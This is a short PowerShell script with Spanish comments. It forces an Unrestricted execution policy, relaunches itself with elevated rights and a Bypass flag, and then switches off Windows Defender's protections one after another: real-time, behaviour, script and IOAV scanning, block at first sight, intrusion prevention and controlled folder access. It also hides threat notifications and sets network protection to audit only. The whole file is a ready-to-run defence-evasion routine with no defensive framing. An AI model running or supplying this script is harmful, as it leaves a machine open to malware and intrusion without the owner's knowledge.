# Intenta cambiar la política de ejecución sin confirmación
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process -Force

# Si no es posible, intenta requerir confirmación automática para 'All' (Opción 'A')
Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force;`"" -Verb RunAs

# Desactiva las notificaciones de Windows Defender antes de realizar cambios
Set-MpPreference -UILockdown $true          # Desactiva las notificaciones de amenazas graves

# Desactiva la supervisión en tiempo real
Set-MpPreference -DisableRealtimeMonitoring $true

# Desactiva el monitoreo de comportamiento
Set-MpPreference -DisableBehaviorMonitoring $true

# Desactiva la protección contra amenazas recién encontradas (Block at First Sight)
Set-MpPreference -DisableBlockAtFirstSeen $true

# Desactiva la protección antivirus de IO
Set-MpPreference -DisableIOAVProtection $true

# Desactiva el modo de privacidad
Set-MpPreference -DisablePrivacyMode $true

# Desactiva el sistema de prevención de intrusiones
Set-MpPreference -DisableIntrusionPreventionSystem $true

# Desactiva el escaneo de scripts
Set-MpPreference -DisableScriptScanning $true

# Desactiva el acceso controlado a carpetas
Set-MpPreference -EnableControlledFolderAccess Disabled

# Establece la protección de red en modo de auditoría
Set-MpPreference -EnableNetworkProtection AuditMode
